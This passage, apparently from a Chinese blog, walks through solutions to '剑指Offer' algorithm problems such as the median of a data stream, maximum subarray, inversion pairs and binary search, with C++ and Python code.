ans(arr.begin(), arr.begin() + k); return ans; &#125; void quick_sort(vector&lt;int&gt;&amp; arr, int l, int r, int k) &#123; if (l &gt;= r) return; int i = partition(arr, l, r); int left_num = i - l + 1; if (k == left_num) &#123; return; &#125; else if (k &lt; left_num) &#123; quick_sort(arr, l, i - 1, k); &#125; else &#123; // k &gt; left_num quick_sort(arr, i + 1, r, k - left_num); &#125; &#125; void random_choose(vector&lt;int&gt;&amp; arr, int l, int r) &#123; int t = rand() % (r - l + 1) + l; swap(arr[r], arr[r]); &#125; int partition(vector&lt;int&gt;&amp; arr, int l, int r) &#123; random_choose(arr, l, r); int temp = arr[r]; int left = l - 1; for (int i = l; i &lt; r; ++i) &#123; if (arr[i] &lt; temp) &#123; left++; swap(arr[left], arr[i]); &#125; &#125; swap(arr[left + 1], arr[r]); return left + 1; &#125;&#125;; 41. 数据流中的中位数 如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。 例如， [2,3,4] 的中位数是 3 [2,3] 的中位数是 (2 + 3) / 2 = 2.5 设计一个支持以下两种操作的数据结构： void addNum(int num) - 从数据流中添加一个整数到数据结构中。 double findMedian() - 返回目前所有元素的中位数。 示例 1： 1234&gt;输入：&gt;[&quot;MedianFinder&quot;,&quot;addNum&quot;,&quot;addNum&quot;,&quot;findMedian&quot;,&quot;addNum&quot;,&quot;findMedian&quot;]&gt;[[],[1],[2],[],[3],[]]&gt;输出：[null,null,null,1.50000,null,2.00000] 示例 2： 1234&gt;输入：&gt;[&quot;MedianFinder&quot;,&quot;addNum&quot;,&quot;findMedian&quot;,&quot;addNum&quot;,&quot;findMedian&quot;]&gt;[[],[2],[],[3],[]]&gt;输出：[null,null,2.00000,null,2.50000] 限制： 最多会对 addNum、findMedian 进行 50000 次调用。 注意：本题与主站 295 题相同：https://leetcode-cn.com/problems/find-median-from-data-stream/ 想想一个排好序的数组，中位数就是中间的元素。如何动态的维护中间的元素呢？ 维护一个最大堆和最小堆，最大堆保存数组左边的，最小堆保存数组右边的，保证左边的个数比右边的多，但不多于1个。 12345678910111213141516171819202122232425262728class MedianFinder &#123; priority_queue&lt;int&gt; left; priority_queue&lt;int&gt; right;public: MedianFinder() &#123;&#125; void addNum(int num) &#123; if (left.empty() || num &lt;= left.top()) &#123; left.push(num); if (right.size() + 1 &lt; left.size()) &#123; int temp = left.top(); left.pop(); right.push(-temp); &#125; &#125; else &#123; // num &gt; left.top() right.push(-num); if (right.size() &gt; left.size()) &#123; int temp = right.top(); right.pop(); left.push(-temp); &#125; &#125; &#125; double findMedian() &#123; return (left.size() + right.size()) &amp; 1? left.top() : (left.top() - right.top()) * 0.5; &#125;&#125;; Python 12345678910111213141516171819class MedianFinder: def __init__(self): self.left = [] self.right = [] def addNum(self, num: int) -&gt; None: if not self.left or -self.left[0] &gt; num: heapq.heappush(self.left, -num) if len(self.right) + 1 &lt; len(self.left): temp = heapq.heappop(self.left) heapq.heappush(self.right, -temp) else: heapq.heappush(self.right, num) if len(self.right) &gt; len(self.left): temp = heapq.heappop(self.right) heapq.heappush(self.left, -temp) def findMedian(self) -&gt; float: return -self.left[0] if (len(self.left) + len(self.right)) &amp; 1 else (-self.left[0] + self.right[0]) * 0.5 42. 连续子数组的最大和 输入一个整型数组，数组中的一个或连续多个整数组成一个子数组。求所有子数组的和的最大值。 要求时间复杂度为O(n)。 示例1: 123&gt;输入: nums &#x3D; [-2,1,-3,4,-1,2,1,-5,4]&gt;输出: 6&gt;解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。 提示： 1 &lt;= arr.length &lt;= 10^5 -100 &lt;= arr[i] &lt;= 100 注意：本题与主站 53 题相同：https://leetcode-cn.com/problems/maximum-subarray/ cur_sum &lt; 0的时候重新计数即可 123456789101112131415161718class Solution &#123;public: int maxSubArray(vector&lt;int&gt;&amp; nums) &#123; if (nums.empty()) &#123; return 0; &#125; int ans = nums[0]; int cur_sum = 0; for (int num : nums) &#123; if (cur_sum &lt; 0) &#123; cur_sum = 0; &#125; cur_sum += num; ans = max(ans, cur_sum); &#125; return ans; &#125;&#125;; 44. 数字序列中某一位的数字 数字以0123456789101112131415…的格式序列化到一个字符序列中。在这个序列中，第5位（从下标0开始计数）是5，第13位是1，第19位是4，等等。 请写一个函数，求任意第n位对应的数字。 示例 1： 12&gt;输入：n &#x3D; 3&gt;输出：3 示例 2： 12&gt;输入：n &#x3D; 11&gt;输出：0 限制： 0 &lt;= n &lt; 2^31 注意：本题与主站 400 题相同：https://leetcode-cn.com/problems/nth-digit/ 首先求出n是几位数，1~9有9个数，10~99有90个数，可以根据这个规律求出 假设求出为cnt位，则从\\(10^{cnt - 1}\\)开始往后的 (n - 1) / cnt个数， 比如求第11个数，cnt求出为2位，则从10开始往后1个数为base_num 最后从base_num中找到（n - 1）% cnt个即可 123456789101112class Solution: def findNthDigit(self, n: int) -&gt; int: if n == 0: return 0 num = 9 cnt = 1 while n &gt; num * cnt: n -= num * cnt cnt += 1 num *= 10 base_num = 10 ** (cnt - 1) + (n - 1) // cnt return int(str(base_num)[(n - 1) % cnt]) 45. 把数组排成最小的数 输入一个非负整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。 示例 1: 12&gt;输入: [10,2]&gt;输出: &quot;102&quot; 示例 2: 12&gt;输入: [3,30,34,5,9]&gt;输出: &quot;3033459&quot; 提示: 0 &lt; nums.length &lt;= 100 说明: 输出结果可能非常大，所以你需要返回一个字符串而不是整数 拼接起来的数字可能会有前导 0，最后结果不需要去掉前导 0 两个字符串a和b，若a+b &lt; b + a则a排前面 Python 12345class Solution: def minNumber(self, nums: List[int]) -&gt; str: nums = list(map(str, nums)) nums = sorted(nums, key=cmp_to_key(lambda a, b: 1 if a + b &gt; b + a else -1)) return &quot;&quot;.join(nums) C++ 1234567891011121314151617class Solution &#123;public: string minNumber(vector&lt;int&gt;&amp; nums) &#123; vector&lt;std::string&gt; str_nums; for (int num : nums) &#123; str_nums.emplace_back(std::to_string(num)); &#125; std::sort(str_nums.begin(), str_nums.end(), [](const std::string&amp;a, const std::string&amp; b) &#123;return a + b &lt; b + a;&#125;); stringstream ss; for (const std::string&amp; num : str_nums) &#123; ss &lt;&lt; num; &#125; return ss.str(); &#125;&#125;; 46. 把数字翻译成字符串 给定一个数字，我们按照如下规则把它翻译为字符串：0 翻译成 “a” ，1 翻译成 “b”，……，11 翻译成 “l”，……，25 翻译成 “z”。一个数字可能有多个翻译。请编程实现一个函数，用来计算一个数字有多少种不同的翻译方法。 示例 1: 123&gt;输入: 12258&gt;输出: 5&gt;解释: 12258有5种不同的翻译，分别是&quot;bccfi&quot;, &quot;bwfi&quot;, &quot;bczi&quot;, &quot;mcfi&quot;和&quot;mzi&quot; 提示： 0 &lt;= num &lt; 2^31 通过次数56,690 提交次数105,188 简单dp即可，若前一个数和当前的数在10~25之间，则dp[i] += dp[i - 2] C++ 123456789101112131415class Solution &#123;public: int translateNum(int num) &#123; string str_num = to_string(num); vector&lt;int&gt; dp(str_num.size(), 0); dp[0] = 1; for (size_t i = 1; i &lt; str_num.size(); ++i) &#123; if (str_num[i - 1] == &#x27;1&#x27; || str_num[i - 1] == &#x27;2&#x27; &amp;&amp; str_num[i] &lt;= &#x27;5&#x27;) &#123; dp[i] = i &gt;= 2? dp[i - 2] : 1; &#125; dp[i] += dp[i - 1]; &#125; return dp[str_num.size() - 1]; &#125;&#125;; 47. 礼物的最大价值 在一个 m*n 的棋盘的每一格都放有一个礼物，每个礼物都有一定的价值（价值大于 0）。你可以从棋盘的左上角开始拿格子里的礼物，并每次向右或者向下移动一格、直到到达棋盘的右下角。给定一个棋盘及其上面的礼物的价值，请计算你最多能拿到多少价值的礼物？ 示例 1: 12345678&gt;输入: &gt;[ [1,3,1], [1,5,1], [4,2,1]&gt;]&gt;输出: 12&gt;解释: 路径 1→3→5→2→1 可以拿到最多价值的礼物 提示： 0 &lt; grid.length &lt;= 200 0 &lt; grid[0].length &lt;= 200 直接dp即可 123456789101112131415161718192021class Solution &#123;public: int maxValue(vector&lt;vector&lt;int&gt;&gt;&amp; grid) &#123; if (grid.empty()) return 0; vector&lt;vector&lt;int&gt;&gt; dp(grid.size(), vector&lt;int&gt;(grid[0].size())); for (std::size_t i = 0; i &lt; grid.size(); ++i) &#123; for (std::size_t j = 0; j &lt; grid[i].size(); ++j) &#123; int temp = 0; if (i &gt; 0) &#123; temp = dp[i - 1][j]; &#125; if (j &gt; 0) &#123; temp = max(temp, dp[i][j - 1]); &#125; dp[i][j] = grid[i][j] + temp; &#125; &#125; return dp.back().back(); &#125;&#125;; Python 1234567891011121314151617class Solution: def maxValue(self, grid: List[List[int]]) -&gt; int: if not grid: return 0 m = len(grid) n = len(grid[0]) dp = [[0 for _ in range(n)] for _ in range(m)] dp[0][0] = grid[0][0] for i in range(1, m): dp[i][0] = grid[i][0] + dp[i - 1][0] for j in range(1, n): dp[0][j] = grid[0][j] + dp[0][j - 1] for i in range(1, m): for j in range(1, n): dp[i][j] = max(dp[i - 1][j], dp[i][j - 1]) + grid[i][j] return dp[-1][-1] 48. 最长不含重复字符的子字符串 请从字符串中找出一个最长的不包含重复字符的子字符串，计算该最长子字符串的长度。 示例 1: 123&gt;输入: &quot;abcabcbb&quot;&gt;输出: 3 &gt;解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。 示例 2: 123&gt;输入: &quot;bbbbb&quot;&gt;输出: 1&gt;解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。 示例 3: 1234&gt;输入: &quot;pwwkew&quot;&gt;输出: 3&gt;解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。 请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。 提示： s.length &lt;= 40000 注意：本题与主站 3 题相同：https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/ c++ 1234567891011121314151617class Solution &#123;public: int lengthOfLongestSubstring(string s) &#123; vector&lt;int&gt; vis(128, -1); int start = 0, ans = 0; for (int j = 0; j &lt; s.size(); ++j) &#123; if (vis[s[j]] &gt;= 0) &#123; for (; start &lt;= vis[s[j]]; ++start) &#123; vis[s[start]] = -1; &#125; &#125; vis[s[j]] = j; ans = max(j - start + 1, ans); &#125; return ans; &#125;&#125;; 方法2： 动态规划 设dp[j]为以s[j]结尾不重复字符的长度， i = vis[s[j]]则为s[j]字符上一次出现的位置。 则有： j - i &lt; dp[j - 1]： 说明上一次出现的位置在j - 1的子串里，只能重新开始，dp[j] = j - i j - i &gt; dp[j - 1]： 说明上一次出现的位置不在j - 1的子串里面，因此dp[j] = dp[j - 1] + 1 考虑一个特殊的情况，若s[j]第一次出现（i &lt; 0）必然有上面第二个式子成立。 123456789101112131415161718class Solution &#123;public: int lengthOfLongestSubstring(string s) &#123; vector&lt;int&gt; vis(128, -1); int last_max = 0, ans = 0; for (int j = 0; j &lt; s.size(); ++j) &#123; int i = vis[s[j]]; if (last_max &lt; j - i) &#123; last_max += 1; &#125; else &#123; last_max = j - i; &#125; vis[s[j]] = j; ans = max(ans, last_max); &#125; return ans; &#125;&#125;; 49. 丑数 我们把只包含质因子 2、3 和 5 的数称作丑数（Ugly Number）。求按从小到大的顺序的第 n 个丑数。 示例: 123&gt;输入: n &#x3D; 10&gt;输出: 12&gt;解释: 1, 2, 3, 4, 5, 6, 8, 9, 10, 12 是前 10 个丑数。 说明: 1 是丑数。 n 不超过1690。 注意：本题与主站 264 题相同：https://leetcode-cn.com/problems/ugly-number-ii/ 题解见本博客另一篇文章 264. Ugly Number II 123456789101112131415class Solution &#123;public: int nthUglyNumber(int n) &#123; vector&lt;int&gt; dp(n, 1); int a = 0, b = 0, c = 0; for (int i = 1; i &lt; n; ++i) &#123; int cur = min(&#123;dp[a] * 2, dp[b] * 3, dp[c] * 5&#125;); if (cur == dp[a] * 2) ++a; if (cur == dp[b] * 3) ++b; if (cur == dp[c] * 5) ++c; dp[i] = cur; &#125; return dp.back(); &#125;&#125;; 51. 数组中的逆序对 在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组，求出这个数组中的逆序对的总数。 示例 1: 12&gt;输入: [7,5,6,4]&gt;输出: 5 限制： 1&gt;0 &lt;&#x3D; 数组长度 &lt;&#x3D; 50000 方法1： 归并排序 12345678910111213141516171819202122232425262728293031323334353637383940414243class Solution &#123; int ans = 0; vector&lt;int&gt; temp; void merge_sort(int i, int j, vector&lt;int&gt;&amp; nums) &#123; if (i &gt;= j) return; int mid = (i + j) &gt;&gt; 1; merge_sort(i, mid, nums); merge_sort(mid + 1, j, nums); merge(i, mid, j, nums); &#125; void merge(int ls, int le, int re, vector&lt;int&gt;&amp;nums) &#123; int rs = le + 1; int i = ls, j = rs, x = 0; while (i &lt;= le &amp;&amp; j &lt;= re) &#123; if (nums[i] &lt;= nums[j]) &#123; temp[x++] = nums[i++]; &#125; else &#123; temp[x++] = nums[j++]; ans += le - i + 1; &#125; &#125; while (i &lt;= le) &#123; temp[x++] = nums[i++]; &#125; while (j &lt;= re) &#123; temp[x++] = nums[j++]; &#125; for (i = ls; i &lt;= re; ++i) &#123; nums[i] = temp[i - ls]; &#125; &#125;public: int reversePairs(vector&lt;int&gt;&amp; nums) &#123; temp.reserve(nums.size()); merge_sort(0, nums.size() - 1, nums); return ans; &#125;&#125;; 方法2：离散化+树状数组 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class FenwickTree &#123; vector&lt;int&gt; _sum; int _n;public: FenwickTree(int n) : _n(n + 1), _sum(n + 1, 0) &#123;&#125; inline int lowbit(int x) &#123; return x &amp; -x; &#125; int sum(int x) &#123; int ans = 0; while (x &gt; 0) &#123; ans += _sum[x]; x -= lowbit(x); &#125; return ans; &#125; void add(int x, int a) &#123; while (x &lt; _n) &#123; _sum[x] += a; x += lowbit(x); &#125; &#125;&#125;;class Solution &#123;public: int reversePairs(vector&lt;int&gt;&amp; nums) &#123; if (nums.empty()) return 0; vector&lt;int&gt; temp_nums(nums); sort(temp_nums.begin(), temp_nums.end()); unordered_map&lt;int, int&gt; nums2id; for (std::size_t i = 0; i &lt; temp_nums.size(); ++i) &#123; nums2id[temp_nums[i]] = i + 1; &#125; int ans = 0; FenwickTree tree(nums.size()); for (int i = nums.size() - 1; i &gt;= 0; --i) &#123; int index = nums2id[nums[i]]; ans += tree.sum(index - 1); tree.add(index, 1); &#125; return ans; &#125;&#125;; 52. 两个链表的第一个公共节点 输入两个链表，找出它们的第一个公共节点。 如下面的两个链表： 在节点 c1 开始相交。 示例 1： 123&gt;输入：intersectVal &#x3D; 8, listA &#x3D; [4,1,8,4,5], listB &#x3D; [5,0,1,8,4,5], skipA &#x3D; 2, skipB &#x3D; 3&gt;输出：Reference of the node with value &#x3D; 8&gt;输入解释：相交节点的值为 8 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。 示例 2： 123&gt;输入：intersectVal &#x3D; 2, listA &#x3D; [0,9,1,2,4], listB &#x3D; [3,2,4], skipA &#x3D; 3, skipB &#x3D; 1&gt;输出：Reference of the node with value &#x3D; 2&gt;输入解释：相交节点的值为 2 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。 示例 3： 1234&gt;输入：intersectVal &#x3D; 0, listA &#x3D; [2,6,4], listB &#x3D; [1,5], skipA &#x3D; 3, skipB &#x3D; 2&gt;输出：null&gt;输入解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。&gt;解释：这两个链表不相交，因此返回 null。 注意： 如果两个链表没有交点，返回 null. 在返回结果后，两个链表仍须保持原有的结构。 可假定整个链表结构中没有循环。 程序尽量满足 O(n) 时间复杂度，且仅用 O(1) 内存。 本题与主站 160 题相同：https://leetcode-cn.com/problems/intersection-of-two-linked-lists/ 题解见本博客另外一篇文章 leetcode Intersection of Two Linked Lists 123456789101112class Solution &#123;public: ListNode *getIntersectionNode(ListNode *headA, ListNode *headB) &#123; ListNode* p = headA; ListNode* q = headB; while (p != q) &#123; p = p ? p-&gt;next : headB; q = q ? q-&gt;next : headA; &#125; return p; &#125;&#125;; Python 1234567class Solution: def getIntersectionNode(self, headA: ListNode, headB: ListNode) -&gt; ListNode: p, q = headA, headB while p != q: p = p.next if p else headB q = q.next if q else headA return p 53 - I. 在排序数组中查找数字 I 统计一个数字在排序数组中出现的次数。 示例 1: 12&gt;输入: nums &#x3D; [5,7,7,8,8,10], target &#x3D; 8&gt;输出: 2 示例 2: 12&gt;输入: nums &#x3D; [5,7,7,8,8,10], target &#x3D; 6&gt;输出: 0 限制： 1&gt;0 &lt;&#x3D; 数组长度 &lt;&#x3D; 50000 注意：本题与主站 34 题相同（仅返回值不同）：https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/ 调包： 1234567891011class Solution &#123;public: int search(vector&lt;int&gt;&amp; nums, int target) &#123; int lower_index = std::lower_bound(nums.begin(), nums.end(), target) - nums.begin(); if (lower_index == nums.size() || nums[lower_index] != target) &#123; return 0; &#125; int upper_index = std::upper_bound(nums.begin(), nums.end(), target) - nums.begin(); return upper_index - lower_index; &#125;&#125;; 123456class Solution: def search(self, nums: List[int], target: int) -&gt; int: lower_index = bisect.bisect_left(nums, target) if len(nums) == lower_index or target != nums[lower_index]: return 0 return bisect.bisect_right(nums, target) - lower_index 手写二分 123456789101112131415161718192021222324252627282930313233343536373839class Solution &#123; int lower_bound(const vector&lt;int&gt;&amp; nums, int target) &#123; int l = 0; int r = nums.size(); while (l &lt; r) &#123; int mid = l + ((r - l) &gt;&gt; 1); if (nums[mid] &lt; target)&#123; l = mid + 1; &#125; else &#123; r = mid; &#125; &#125; return l; &#125; int upper_bound(const vector&lt;int&gt;&amp; nums, int target) &#123; int l = 0; int r = nums.size(); while (l &lt; r) &#123; int mid = l + ((r - l) &gt;&gt; 1); if (nums[mid] &lt;= target)&#123; l = mid + 1; &#125; else &#123; r = mid; &#125; &#125; return l; &#125;public: int search(vector&lt;int&gt;&amp; nums, int target) &#123; int lower_index = lower_bound(nums, target); if (lower_index == nums.size() || nums[lower_index] != target) &#123; return 0; &#125; int upper_index = upper_bound(nums, target); return upper_index - lower_index; &#125;&#125;; 53 - II. 0～n-1中缺失的数字 一个长度为n-1的递增排序数组中的所有数字都是唯一的，并且每个数字都在范围0～n-1之内。在范围0～n-1内的n个数字中有且只有一个数字不在该数组中，请找出这个数字。 示例 1: 12&gt;输入: [0,1,3]&gt;输出: 2 示例 2: 12&gt;输入: [0,1,2,3,4,5,6,7,9]&gt;输出: 8 限制： 1&gt;1 &lt;&#x3D; 数组长度 &lt;&#x3D; 10000 二分，对于mid，如果之前的有序，必然有nums[mid] == mid，否则，nums[mid] &gt; mid 12345678910111213141516class Solution &#123;public: int missingNumber(vector&lt;int&gt;&amp; nums) &#123; int l = 0; int r = nums.size(); while (l &lt; r)&#123; int mid = l + ((r - l) &gt;&gt; 1); if (mid &lt; nums[mid]) &#123; r = mid; &#125; else &#123; l = mid + 1; &#125; &#125; return l; &#125;&#125;; 54. 二叉搜索树的第k大节点 给定一棵二叉搜索树，请找出其中第k大的节点。 示例 1: 1234567&gt;输入: root &#x3D; [3,1,4,null,2], k &#x3D; 1 3 &#x2F; \\1 4 \\ 2&gt;输出: 4 示例 2: 123456789&gt;输入: root &#x3D; [5,3,6,2,4,null,null,1], k &#x3D; 3 5 &#x2F; \\ 3 6 &#x2F; \\ 2 4 &#x2F;1&gt;输出: 4 限制： 1 ≤ k ≤ 二叉搜索树元素个数 二叉搜索树可以用中序遍历转为有序数组。题目求的是第k大的元素，所以可以先遍历右子树-中间节点-左子树，从而求得第k大的元素 12345678910111213141516class Solution &#123; int _ans = 0; void dfs(TreeNode* root, int&amp; k) &#123; if (!root) return; dfs(root-&gt;right, k); if (--k == 0) &#123; _ans = root-&gt;val; &#125; dfs(root-&gt;left, k); &#125;public: int kthLargest(TreeNode* root, int k) &#123; dfs(root, k); return _ans; &#125;&#125;; 55 - I. 二叉树的深度 输入一棵二叉树的根节点，求该树的深度。从根节点到叶节点依次经过的节点（含根、叶节点）形成树的一条路径，最长路径的长度为树的深度。 例如： 给定二叉树 [3,9,20,null,null,15,7]， 12345 3 &#x2F; \\9 20 &#x2F; \\ 15 7 返回它的最大深度 3 。 提示： 节点总数 &lt;= 10000 注意：本题与主站 104 题相同：https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/ 直接递归遍历即可 1234567class Solution &#123;public: int maxDepth(TreeNode* root) &#123; if (!root) return 0; return max(maxDepth(root-&gt;left), maxDepth(root-&gt;right)) + 1; &#125;&#125;; 55 - II. 平衡二叉树 输入一棵二叉树的根节点，判断该树是不是平衡二叉树。如果某二叉树中任意节点的左右子树的深度相差不超过1，那么它就是一棵平衡二叉树。 示例 1: 给定二叉树 [3,9,20,null,null,15,7] 12345 3 &#x2F; \\9 20 &#x2F; \\ 15 7 返回 true 。 示例 2: 给定二叉树 [1,2,2,3,3,null,null,4,4] 1234567 1 &#x2F; \\ 2 2 &#x2F; \\ 3 3 &#x2F; \\4 4 返回 false 。 限制： 1 &lt;= 树的结点个数 &lt;= 10000 注意：本题与主站 110 题相同：https://leetcode-cn.com/problems/balanced-binary-tree/ dfs求深度即可 123456789101112class Solution: def dfs(self, root) -&gt; int: if not root: return 0 left_d = self.dfs(root.left) right_d = self.dfs(root.right) if left_d &gt; right_d + 1 or left_d + 1 &lt; right_d: return -10000 return max(left_d, right_d) + 1 def isBalanced(self, root: TreeNode) -&gt; bool: depth = self.dfs(root) return depth &gt;= 0 56 - I. 数组中数字出现的次数 一个整型数组 nums 里除两个数字之外，其他数字都出现了两次。请写程序找出这两个只出现一次的数字。要求时间复杂度是O(n)，空间复杂度是O(1)。 示例 1： 12&gt;输入：nums &#x3D; [4,1,4,6]&gt;输出：[1,6] 或 [6,1] 示例 2： 12&gt;输入：nums &#x3D; [1,2,10,4,1,4,3,3]&gt;输出：[2,10] 或 [10,2] 限制： 2 &lt;= nums.length &lt;= 10000 题解见本博客另外一篇文章 single-number-iii 1234567891011class Solution: def singleNumbers(self, nums: List[int]) -&gt; List[int]: x = 0 for num in nums: x ^= num ans = [0, 0] x = x &amp; -x for num in nums: ans[num &amp; x == 0] ^= num return ans 用了reduce函数 12345678class Solution: def singleNumbers(self, nums: List[int]) -&gt; List[int]: x = functools.reduce(lambda a, b: a ^ b, nums, 0) x = x &amp; -x ans = [0, 0] for num in nums: ans[num &amp; x == 0] ^= num return ans 56 - II. 数组中数字出现的次数 II 在一个数组 nums 中除一个数字只出现一次之外，其他数字都出现了三次。请找出那个只出现一次的数字。 示例 1： 12&gt;输入：nums &#x3D; [3,4,3,3]&gt;输出：4 示例 2： 12&gt;输入：nums &#x3D; [9,1,7,9,7,9,7]&gt;输出：1 限制： 1 &lt;= nums.length &lt;= 10000 1 &lt;= nums[i] &lt; 2^31 题解见本博客另外一篇文章 single-number-ii 方法1 1234567891011121314class Solution &#123;public: int singleNumber(vector&lt;int&gt;&amp; nums) &#123; int ans = 0; for (int i = 0; i &lt; 32; ++i) &#123; int cnt = 0; for (int num : nums) &#123; cnt += (num &gt;&gt; i) &amp; 1; &#125; ans |= (cnt % 3) &lt;&lt; i; &#125; return ans; &#125;&#125;; 方法2 1234567class Solution: def singleNumber(self, nums: List[int]) -&gt; int: one = two = 0 for num in nums: one = one ^ num &amp; ~two two = two ^ num &amp; ~one return one 57. 和为s的两个数字 输入一个递增排序的数组和一个数字s，在数组中查找两个数，使得它们的和正好是s。如果有多对数字的和等于s，则输出任意一对即可。 示例 1： 12&gt;输入：nums &#x3D; [2,7,11,15], target &#x3D; 9&gt;输出：[2,7] 或者 [7,2] 示例 2： 12&gt;输入：nums &#x3D; [10,26,30,31,47,60], target &#x3D; 40&gt;输出：[10,30] 或者 [30,10] 限制： 1 &lt;= nums.length &lt;= 10^5 1 &lt;= nums[i] &lt;= 10^6 方法1,：hash表，复杂度O(n) 1234567891011121314class Solution &#123;public: vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123; unordered_set&lt;int&gt; vis; for (int num : nums) &#123; int key = target - num; if (vis.find(key) != vis.end()) &#123; return &#123;num, key&#125;; &#125; vis.insert(num); &#125; return &#123;&#125;; &#125;&#125;; 方法2： 由于是有序的数组，因此可以用双指针的方法： 123456789101112131415class Solution &#123;public: vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123; for (int i = 0, j = nums.size() - 1; i &lt; j; ) &#123; if (nums[i] + nums[j] == target) &#123; return &#123;nums[i], nums[j]&#125;; &#125; else if (nums[i] + nums[j] &lt; target) &#123; ++i; &#125; else &#123; --j; &#125; &#125; return &#123;&#125;; &#125;&#125;; 57 - II. 和为s的连续正数序列 输入一个正整数 target ，输出所有和为 target 的连续正整数序列（至少含有两个数）。 序列内的数字由小到大排列，不同序列按照首个数字从小到大排列。 示例 1： 12&gt;输入：target &#x3D; 9&gt;输出：[[2,3,4],[4,5]] 示例 2： 12&gt;输入：target &#x3D; 15&gt;输出：[[1,2,3,4,5],[4,5,6],[7,8]] 限制： 1 &lt;= target &lt;= 10^5 方法1， 枚举起点和终点，复杂度\\(O(target \\sqrt{target})\\) // 长度不超过sqrt(target) 方法2： 枚举起点，直接用等差数列通项公式计算出需要多少个数才能到target，O(n) \\[ \\frac{(i + i + n - 1) * n}{2} = target \\] 求上面的n即可 需要注意的是开根号出来需要是整数，最后求根公式的结果要是个偶数。 123456789101112131415161718192021222324252627class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; findContinuousSequence(int target) &#123; int end = target &gt;&gt; 1; vector&lt;vector&lt;int&gt;&gt; ans; for (int i = 1; i &lt;= end; ++i) &#123; long long temp = 2 * i - 1; long long x = (temp * temp + 8 * target); long long sqrt_x = sqrt(x); if (sqrt_x * sqrt_x != x) &#123; continue; &#125; int double_n = sqrt_x + (1 - 2 * i); if (double_n &amp; 1) &#123; continue; &#125; int n = double_n &gt;&gt; 1; int e = i + n - 1; vector&lt;int&gt; cur(n, 0); for (int j = 0; j &lt; n; ++j) &#123; cur[j] = i + j; &#125; ans.emplace_back(std::move(cur)); &#125; return ans; &#125;&#125;; 方法3 利用双指针滑动窗口。 当前为i...j， 若sum(i, j) &lt; target ，说明j需要往上加，使得和变大，这样才可能为target 若sum(i, j) &gt; target，说明i要往上加，使得和变小 若sum(i, j) == target，则找到了 这个其实也是方法1的改进版本，若[i, j]为解(和为target)，那么[i + 1, j]的和必然小于target, 下一次遍历应该从j + 1开始，而不是l + 2 那么这个方法可能错过解吗？比如[i + 1, x - 1]是个解，会不会遍历的时候变成[i, x]导致错过？ 答案是否定的，[i, x]能便利到必然说明 [i, x -1]小于解，而sum[i + 1, x - 1] &lt; sum[i, x - 1] c++代码如下 1234567891011121314151617181920212223class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; findContinuousSequence(int target) &#123; int end = target &gt;&gt; 1; vector&lt;vector&lt;int&gt;&gt; ans; for (int i = 1, j = 1; i &lt;= end; ) &#123; int sum = (i + j) * (j - i + 1) &gt;&gt; 1; if (sum == target) &#123; vector&lt;int&gt; cur(j - i + 1, 0); for (int x = i; x &lt;= j; ++x) &#123; cur[x - i] = x; &#125; ans.emplace_back(std::move(cur)); ++i; &#125; else if (sum &lt; target)&#123; ++j; &#125; else &#123; ++i; &#125; &#125; return ans; &#125;&#125;; 58 - I. 翻转单词顺序 输入一个英文句子，翻转句子中单词的顺序，但单词内字符的顺序不变。为简单起见，标点符号和普通字母一样处理。例如输入字符串\"I am a student. \"，则输出\"student. a am I\"。 示例 1： 12&gt;输入: &quot;the sky is blue&quot;&gt;输出: &quot;blue is sky the&quot; 示例 2： 123&gt;输入: &quot; hello world! &quot;&gt;输出: &quot;world! hello&quot;&gt;解释: 输入字符串可以在前面或者后面包含多余的空格，但是反转后的字符不能包括。 示例 3： 123&gt;输入: &quot;a good example&quot;&gt;输出: &quot;example good a&quot;&gt;解释: 如果两个单词间有多余的空格，将反转后单词间的空格减少到只含一个。 说明： 无空格字符构成一个单词。 输入字符串可以在前面或者后面包含多余的空格，但是反转后的字符不能包括。 如果两个单词间有多余的空格，将反转后单词间的空格减少到只含一个。 注意：本题与主站 151 题相同：https://leetcode-cn.com/problems/reverse-words-in-a-string/ 注意：此题对比原题有改动 双指针遍历即可。。 12345678910111213141516171819202122class Solution &#123;public: string reverseWords(string s) &#123; stringstream ss; for (int i = static_cast&lt;int&gt;(s.size()) - 1; i &gt;= 0; ) &#123; if (s[i] == &#x27; &#x27;) &#123; --i; continue; &#125; int j = i - 1; for (; j &gt;= 0 &amp;&amp; s[j] != &#x27; &#x27;; --j) &#123; &#125; ss &lt;&lt; (s.substr(j + 1, i - j)) &lt;&lt; &quot; &quot;; i = j; &#125; string ans = ss.str(); if (!ans.empty()) ans.pop_back(); return ans; &#125;&#125;; python 123class Solution: def reverseWords(self, s: str) -&gt; str: return &#x27; &#x27;.join(s.strip().split()[::-1]) 58 - II. 左旋转字符串 字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。请定义一个函数实现字符串左旋转操作的功能。比如，输入字符串\"abcdefg\"和数字2，该函数将返回左旋转两位得到的结果\"cdefgab\"。 示例 1： 12&gt;输入: s 